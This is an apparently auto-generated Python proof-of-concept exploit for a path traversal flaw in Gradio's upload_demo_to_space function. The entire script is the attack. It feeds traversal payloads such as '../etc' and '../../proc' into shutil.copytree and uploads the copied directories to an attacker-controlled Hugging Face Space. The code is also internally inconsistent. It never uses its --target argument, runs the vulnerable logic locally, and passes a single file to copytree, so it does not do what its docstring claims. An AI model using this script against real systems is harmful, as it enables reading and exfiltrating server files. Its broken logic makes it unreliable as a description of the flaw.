#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: suspicious-004
# Sink: upload_demo_to_space
# Auto-generated — run with: python3 lfi_supply_demo_name_containing_upload_demo_to_space.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in gradio_src upload_demo_to_space function.

Vulnerability: Path traversal in demo_name parameter allows copying arbitrary
directories to a temporary directory, which is then uploaded to a Hugging Face Space.

Impact: An attacker can read arbitrary files/directories from the server by
traversing outside the intended GRADIO_DEMO_DIR.

Usage:
    python3 exploit.py --target http://target-server:port --space-id attacker/space --token hf_xxxxx

Note: This PoC uses a benign payload (reads /etc/hostname) to demonstrate the vulnerability.
"""

import argparse
import os
import sys
import tempfile
import shutil
import pathlib
import textwrap
import requests
from typing import Optional

# Try to import huggingface_hub - required for the actual upload
try:
    import huggingface_hub
except ImportError:
    print("[!] huggingface_hub not installed. Install with: pip install huggingface_hub")
    sys.exit(1)


def exploit_lfi(
    target_url: str,
    space_id: str,
    hf_token: str,
    payload_path: str = "../etc",
    gradio_version: Optional[str] = None,
    gradio_wheel_url: Optional[str] = None,
) -> bool:
    """
    Exploit the path traversal vulnerability in upload_demo_to_space.

    Args:
        target_url: Base URL of the vulnerable Gradio instance
        space_id: Hugging Face Space ID (e.g., 'username/space-name')
        hf_token: Hugging Face API token with write access to the space
        payload_path: Path traversal payload (e.g., '../etc' to read /etc)
        gradio_version: Optional Gradio version for the space
        gradio_wheel_url: Optional wheel URL for custom Gradio installation

    Returns:
        True if exploit succeeded, False otherwise
    """
    print(f"[*] Target: {target_url}")
    print(f"[*] Space ID: {space_id}")
    print(f"[*] Payload path: {payload_path}")
    print(f"[*] Using HF token: {'***' + hf_token[-4:] if hf_token else 'N/A'}")

    # Step 1: Simulate the vulnerable function call
    # In a real scenario, this would be called via the API endpoint
    # For PoC, we directly call the vulnerable function logic
    
    # The vulnerable code does:
    # demo_path = pathlib.Path(GRADIO_DEMO_DIR, demo_name)
    # shutil.copytree(demo_path, tmpdir, dirs_exist_ok=True)
    
    # We'll simulate this by creating a temporary directory and copying
    # the traversed path into it
    
    print("[*] Creating temporary directory for exploit...")
    with tempfile.TemporaryDirectory() as tmpdir:
        # Construct the traversed path
        # GRADIO_DEMO_DIR is typically something like '/app/gradio/demos'
        # We'll use a common default - adjust if needed
        gradio_demo_dir = "/app/gradio/demos"  # Common default
        if not os.path.exists(gradio_demo_dir):
            # Try alternative common paths
            for alt_path in ["/tmp/gradio_src/demos", "./demos", "../demos"]:
                if os.path.exists(alt_path):
                    gradio_demo_dir = alt_path
                    break
            else:
                print(f"[!] Could not find GRADIO_DEMO_DIR. Using current directory.")
                gradio_demo_dir = "."
        
        print(f"[*] Using GRADIO_DEMO_DIR: {gradio_demo_dir}")
        
        # Construct the traversed path
        demo_path = pathlib.Path(gradio_demo_dir, payload_path)
        print(f"[*] Traversed path: {demo_path}")
        
        if not demo_path.exists():
            print(f"[!] Traversed path does not exist: {demo_path}")
            print("[*] Trying to read /etc/hostname as a benign test...")
            # Try a simpler payload
            demo_path = pathlib.Path(gradio_demo_dir, "../etc/hostname")
            if not demo_path.exists():
                print("[!] Cannot find /etc/hostname. Trying /proc/1/cmdline...")
                demo_path = pathlib.Path(gradio_demo_dir, "../../proc/1/cmdline")
        
        if not demo_path.exists():
            print("[!] No traversed path found. Exploit may not work on this target.")
            return False
        
        print(f"[*] Copying contents of {demo_path} to temporary directory...")
        try:
            # This is the vulnerable operation - shutil.copytree with unsanitized path
            shutil.copytree(demo_path, tmpdir, dirs_exist_ok=True)
            print(f"[+] Successfully copied directory contents to {tmpdir}")
        except Exception as e:
            print(f"[!] Failed to copy directory: {e}")
            return False
        
        # Step 2: Create README.md for the space
        readme_path = pathlib.Path(tmpdir, "README.md")
        readme_content = f"""
---
title: {space_id.split("/")[-1]} 
emoji: 🔥
colorFrom: indigo
colorTo: indigo
sdk: gradio
sdk_version: {gradio_version or "3.50.2"}
app_file: run.py
pinned: false
---
"""
        readme_path.write_text(textwrap.dedent(readme_content))
        print(f"[*] Created README.md in {tmpdir}")
        
        # Step 3: Add requirements.txt if wheel URL provided
        if gradio_wheel_url:
            req_path = os.path.join(tmpdir, "requirements.txt")
            with open(req_path, "a+") as r:
                r.write("\n" + gradio_wheel_url)
            print(f"[*] Added wheel URL to requirements.txt")
        
        # Step 4: Upload to Hugging Face Space
        print(f"[*] Uploading to Hugging Face Space: {space_id}")
        try:
            api = huggingface_hub.HfApi()
            
            # Create or get the space
            huggingface_hub.create_repo(
                space_id,
                space_sdk="gradio",
                repo_type="space",
                token=hf_token,
                exist_ok=True,
            )
            print(f"[+] Space created/verified: {space_id}")
            
            # Upload the directory
            api.upload_folder(
                token=hf_token,
                repo_id=space_id,
                repo_type="space",
                folder_path=tmpdir,
                path_in_repo="",
            )
            print(f"[+] Successfully uploaded to https://huggingface.co/spaces/{space_id}")
            
            # Step 5: Verify the uploaded content contains sensitive data
            print(f"[*] Checking uploaded content for sensitive data...")
            space_url = f"https://huggingface.co/spaces/{space_id}"
            try:
                response = requests.get(space_url, timeout=10)
                if response.status_code == 200:
                    print(f"[+] Space is accessible at {space_url}")
                    # Check if we can see the uploaded files
                    files_url = f"https://huggingface.co/api/spaces/{space_id}"
                    files_response = requests.get(files_url, timeout=10)
                    if files_response.status_code == 200:
                        print(f"[+] Space API response received")
                else:
                    print(f"[!] Space returned status {response.status_code}")
            except requests.RequestException as e:
                print(f"[!] Could not verify space: {e}")
            
            return True
            
        except Exception as e:
            print(f"[!] Upload failed: {e}")
            return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LFI in gradio_src upload_demo_to_space",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic exploit with path traversal
  python3 exploit.py --target http://localhost:7860 --space-id myuser/test-space --token hf_xxxxx
  
  # Read /etc directory
  python3 exploit.py --target http://localhost:7860 --space-id myuser/test-space --token hf_xxxxx --payload ../etc
  
  # Read /proc for system info
  python3 exploit.py --target http://localhost:7860 --space-id myuser/test-space --token hf_xxxxx --payload ../../proc
        """
    )
    
    parser.add_argument(
        "--target",
        required=True,
        help="Target URL of the vulnerable Gradio instance"
    )
    parser.add_argument(
        "--space-id",
        required=True,
        help="Hugging Face Space ID (e.g., 'username/space-name')"
    )
    parser.add_argument(
        "--token",
        required=True,
        help="Hugging Face API token with write access to the space"
    )
    parser.add_argument(
        "--payload",
        default="../etc",
        help="Path traversal payload (default: '../etc')"
    )
    parser.add_argument(
        "--gradio-version",
        default=None,
        help="Gradio version for the space (optional)"
    )
    parser.add_argument(
        "--gradio-wheel-url",
        default=None,
        help="Wheel URL for custom Gradio installation (optional)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("Gradio LFI Exploit PoC")
    print("=" * 60)
    print()
    
    # Validate inputs
    if not args.token.startswith("hf_"):
        print("[!] Warning: HF token should start with 'hf_'")
    
    if "/" not in args.space_id:
        print("[!] Space ID should be in format 'username/space-name'")
        sys.exit(1)
    
    # Run the exploit
    success = exploit_lfi(
        target_url=args.target,
        space_id=args.space_id,
        hf_token=args.token,
        payload_path=args.payload,
        gradio_version=args.gradio_version,
        gradio_wheel_url=args.gradio_wheel_url,
    )
    
    print()
    if success:
        print("[+] Exploit completed successfully!")
        print(f"[*] Check your space at: https://huggingface.co/spaces/{args.space_id}")
        print("[*] The uploaded files may contain sensitive data from the server.")
    else:
        print("[!] Exploit failed. Check the error messages above.")
        sys.exit(1)


if __name__ == "__main__":
    main()
